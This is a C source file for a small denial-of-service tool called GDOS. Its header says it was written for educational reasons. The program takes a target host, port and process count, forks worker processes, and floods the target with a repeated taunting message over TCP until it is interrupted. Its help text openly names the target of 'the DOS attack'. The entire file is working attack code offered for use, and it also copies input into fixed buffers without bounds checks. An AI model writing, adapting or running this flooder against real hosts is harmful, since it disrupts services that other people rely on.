/*
AUTHOR:  Garbaz
E-MAIL:  garbaz@t-online.de
PROJECT: A very shitty DOS tool, mainly built for educational reasons
LICENSE: 

	The MIT License (MIT)
	
	Copyright (c) 2016 
	
	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.
	
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
*/


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>


#define TARGET_BUFFER_SIZE 256
#define PORT_BUFFER_SIZE 8
#define DEFAULT_PORT "80"
#define DEFAULT_THREADS 1
#define RUN_DELAY 5
#define MESSAGE_LENGTH 17
#define MESSAGE "get wrecked boy!"

#define PRINT_LOG if(isParent)printf

void handle_args(int argc, char* argv[]);
void print_help(char* argv0);

char target_buffer[TARGET_BUFFER_SIZE], port_buffer[PORT_BUFFER_SIZE], *message;
int threads, sockfd, isParent;
int *pids;
struct sigaction sa;


void interrupt_handler(int sig)
{
	if(isParent)
	{
		printf("Killing child processes...\n");
		//Kill children
		kill(0, SIGKILL);	
		free(pids);
		wait(NULL);
		printf("...done!\n");
	}
	else
	{
		
	}
	exit(0);
}


int main(int argc, char* argv[])
{
	message = MESSAGE;
	
	sa.sa_handler = interrupt_handler;
	sa.sa_flags = 0;
	sigemptyset(&sa.sa_mask);
	
	if (sigaction(SIGINT, &sa, NULL) == -1) {
		perror("sigaction");
		exit(1);
	}
	
	threads = DEFAULT_THREADS;
	strcpy(port_buffer, DEFAULT_PORT);
	
	handle_args(argc, argv);
	
	printf("(PRESS CTRL-C to CANCEL!)");
	printf("\nRunning GDOS on target \"%s\" on port \"%s\" on %d thread(s) in ...\n", target_buffer, port_buffer, threads);
	sleep(1);
	for(int i = RUN_DELAY; i > 0; i--)
	{
		printf("...%d...\n", i);
		sleep(1);
	}
	printf("....GO!\n");
	
	//TODO: Get rid of this to actually run.....
	//printf("\nPEW PEW PEW...\n");
	//return 0
	
	struct addrinfo hints, *servinfo;
	
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	
	
	PRINT_LOG("Resolving address...\n");
	if(getaddrinfo(target_buffer, port_buffer, &hints, &servinfo) != 0)
	{
		perror("getaddrinfo");
		return 3;
	}
	PRINT_LOG("done!\n");
	
	isParent = 1;
	if(threads > 1)
	{
		PRINT_LOG("Creating child processes...\n");
		pids = malloc((threads-1) * sizeof(int));
		
		for(int i = 0; i < threads-1; i++)
		{
			int pid = fork();
			if(pid == -1)
			{
				//Something went wrong, print error and exit
				perror("fork");
				return 2;
			}
			else if(pid == 0)
			{
				//Is child, free pids, set isParent=0, go labour
				free(pids);
				isParent = 0;
				break;
			}
			//Is parent, save pid and keep forking
			pids[i] = pid;
		}
		PRINT_LOG("done!\n");
	}
	
	
	PRINT_LOG("Setting up socket...\n");
	if((sockfd = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol)) == -1)
	{
		perror("socket");
		return 4;
	}
	PRINT_LOG("done!\n");
	
	
	PRINT_LOG("Connecting to server...\n");
	if(connect(sockfd, servinfo->ai_addr, servinfo->ai_addrlen) == -1)
	{
		perror("connect");
		return 5;
	}
	freeaddrinfo(servinfo);
	PRINT_LOG("done!\n");
	
	
	PRINT_LOG("Started sending packages.....\n");
	while(1)
	{
		if(send(sockfd, message, MESSAGE_LENGTH, 0) == -1)
		{
			fprintf(stderr, "Unable to send, server down?\n");
			perror("send");
		}
	}
}



void handle_args(int argc, char* argv[])
{
	for(int i = 0; i < argc; i++)
	{
		if(argc == 1 || strcmp(argv[i], "-I") == 0 || strcmp(argv[i], "--interactive") == 0)
		{
			//Interactive
			printf("Running in inteactive mode... (\"-h\" or \"--help\" for help)\n\n");
			printf("Target (IP/URL): ");
			scanf("%s", target_buffer);
			printf("Target Port [Use 80 if unsure]: ");
			scanf("%s", port_buffer);
			printf("Thread count [positive integer, use 1 if unsure]: ");
			while(scanf("%d", &threads) == EOF || threads == 0)
			{
				printf("Thread count [POSITIVE INTEGER, use 1 if unsure]: ");
			}
		}
		if(i == 0) continue;
		else if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0)
		{
			//Help
			print_help(argv[0]);
			
			exit(0);
		}
		else if(strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0)
		{
			strcpy(port_buffer, argv[i+1]);
			i++;
		}
		else if(strcmp(argv[i], "-t") == 0 || strcmp(argv[i], "--threads") == 0)
		{
			if((threads = atoi(argv[i+1])) == 0)
			{
				perror("thread_count");
				exit(1);
			}
			i++;
		}
		else
		{
			strcpy(target_buffer, argv[i]);
		}
	};
}


void print_help(char* argv0)
{
	printf("\nSynopsis:\n");
	printf("%s [-p PORT] [-t THR] [-h] TARGET\n\n", argv0);
	printf("TARGET is the IP/URL to target of the DOS attack,\n");
	printf("PORT which port to send to and\n");
	printf("THR how many threads to run simultaneously\n\n");
	printf("+-----------------------+-------------------------+\n");
	printf("| PARAMETER             | FUNCTION                |\n");
	printf("+-----------------------+-------------------------+\n");
	printf("| -h, --help            | Print this help message |\n");
	printf("| -I, --interactive     | Run in interactive mode |\n");
	printf("| -p PORT, --port PORT  | Direct packets at PORT  |\n");
	printf("| -t THR, --threads THR | Run THR threads         |\n");
	printf("+-----------------------+-------------------------+\n");
	printf("\nArguments are handled in the order they are given and the last one of a type will overwrite any previous ones of the same type!\n");
	printf("This also counts for interactive mode!\n");
	printf("e.g.: \"./gdos -I -t 5\" will run in interactive mode, but the thread count will be overwritten with 5\n");
	printf("\nFeel free to test some parameters out, the program will print out with what settings it will run and give you 5 seconds to cancel.\n\n");
}
